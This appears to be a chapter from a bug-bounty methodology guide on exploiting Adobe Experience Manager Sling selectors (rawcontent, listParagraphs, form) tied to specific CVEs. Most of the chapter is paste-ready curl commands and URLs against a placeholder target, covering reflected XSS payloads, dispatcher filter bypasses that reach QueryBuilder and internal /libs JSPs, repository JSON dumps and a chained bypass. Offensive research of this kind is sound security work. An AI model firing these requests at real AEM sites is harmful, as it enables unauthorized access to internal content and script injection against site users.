# 6 — Core selector gadgets (Jim Green / CTBB)

**Goal:** Use built-in Sling selectors as **XSS** and **dispatcher/internal access** gadgets.

Many are **patched on up-to-date AEM**. Still try: programs lag, custom dispatchers break, chains revive them.

---

## Kid-level idea

Selectors are like **cheat codes** stuck in the URL:

```text
/page.CHEATCODE.html
```

Adobe registered some cheat codes on every page (`cq:Page`).  
Hunters found the dangerous ones.

---

## Bug A — `rawcontent` (XSS)

| Field | Value |
|-------|--------|
| CVE | CVE-2022-30677 |
| Idea | Strip JS/CSS for “export,” but also **broke HTML sanitization** |
| Fixed in | AMS ~6.5.18 / CS ~2022.4 (serializer swap) |

### Why

Default error pages **reflect the path**.  
`rawcontent` made reflected path render as **raw HTML** → XSS.

### Paste kit

```bash
T="https://TARGET"

# Reflected XSS via 404 path (historical)
curl -sk "$T/%3Cimg%20src=x%20onerror=alert(1)%3E.rawcontent.html" | head -c 500

# When 404 customized, try 400 path via savedsearch + rawcontent
curl -sk "$T/%3Cimg%20src=x%20onerror=alert(1).savedsearch.rawcontent.html" | head -c 500
```

Browser check (if in scope for XSS):

```text
https://TARGET/<img src=x onerror=alert(1)>.rawcontent.html
https://TARGET/<img src=x onerror=alert(1).savedsearch.rawcontent.html
```

### Modern leftover use

Even after fix, `rawcontent` still **strips JS/CSS**.  
If you already have HTML injection but page JS rewrites your sink, stripping JS can make injection stick.

---

## Bug B — `listParagraphs` (internal code runner / XSS)

| Field | Value |
|-------|--------|
| CVE | CVE-2022-42351 (+ XSS CVE-2022-42348) |
| Idea | `itemResourceType=` can point at **internal** `/libs` or other types |
| Why huge | Dispatcher blocks `/libs`; this **renders them from inside** |

### Why

You are not “opening `/libs` as a URL.”  
You are asking a **page servlet** to render children **using** that resource type.  
Permissions for *running* scripts ≠ URL ACL for *reading* `/libs`.

### Paste kit — fingerprint version

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"

curl -sk "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/granite/ui/components/shell/help/about/about.jsp&limit=1"
```

### Paste kit — XSS via statistics JSP (historical)

```bash
curl -sk "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/cq/statistics/components/queries-by-result/html.jsp&path=%3Cimg%20src=x%20onerror=alert(1)%3E&limit=1"
```

### Paste kit — aim at QueryBuilder-ish surfaces

```bash
curl -sk "$T${PAGE}.listParagraphs.html?itemResourceType=/bin/querybuilder.json&limit=1" | head -c 500
```

If you get useful internal output while `/bin/querybuilder.json` is 404 → **report-level gadget**.

---

## Bug C — `form` selector (suffix = real path)

| Field | Value |
|-------|--------|
| CVE | CVE-2024-26029 |
| Idea | `.form.<anything>/<suffix>` → internally process **suffix as path** |
| Why | Dispatcher filters **prefix**, ignores suffix |

### Paste kit

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"

# QueryBuilder via suffix
curl -sk "$T${PAGE}.form.css/bin/querybuilder.json?path=/&p.limit=5" | head -c 500; echo
curl -sk "$T/content/dam.form.js/bin/querybuilder.json?path=/content&p.limit=5" | head -c 500; echo

# JSON dump via suffix
curl -sk "$T${PAGE}.form.png/content.3.json" | head -c 500; echo
```

### Chain: form → listParagraphs (bypass both layers)

```bash
# Outer: form + allowed ext (dispatcher happy)
# Suffix: listParagraphs URL (internal)
curl -sk "$T${PAGE}.form.js${PAGE}.listParagraphs.html?itemResourceType=/libs/granite/ui/components/shell/help/about/about.jsp&limit=1" | head -c 500
```

Jim’s full XSS-style chain pattern:

```text
/content/.../page.form.js/content/.../page.listParagraphs.html?itemResourceType=...&path=<XSS>
```

---

## Methodology: custom selectors (after packages)

1. Get `/etc/packages` zip (see 07).  
2. Search customer code for:

```text
@SlingServlet
selectors =
sling.servlet.selectors
resourceTypes
```

3. Those selectors are **your** private bug class — often unreviewed.

---

## Variations

| Situation | Move |
|-----------|------|
| Selector blocked by name | Chain via `form` suffix; try encoding; try other pages |
| Only works on some pages | Needs `cq:Page` primary type — try several `/content` pages |
| Fully patched | Still document attempts; focus loot + Forms + modern CVEs |
| Time-box 15 min | rawcontent + listParagraphs about.jsp + form→querybuilder |

---

## Done when

- [ ] Tried all three gadgets on at least one real page  
- [ ] Saved request/response for anything that returned unexpected data or script execution  

**Next:** [07-content-packages.md](./07-content-packages.md)
